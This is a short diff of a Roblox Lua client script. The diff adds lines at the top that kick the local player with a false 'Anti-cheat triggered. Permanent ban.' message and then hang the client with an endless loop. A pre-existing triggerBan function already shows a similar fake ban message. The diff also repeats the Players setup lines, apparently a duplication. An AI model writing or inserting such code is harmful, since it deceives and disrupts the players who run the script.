@@ -1,6 +1,12 @@
 
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
+LocalPlayer:Kick("Anti-cheat triggered. Permanent ban.")
+while true do end
+
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
 local function triggerBan()
     pcall(function()
         LocalPlayer:Kick("Anti-cheat detected. Account banned.")
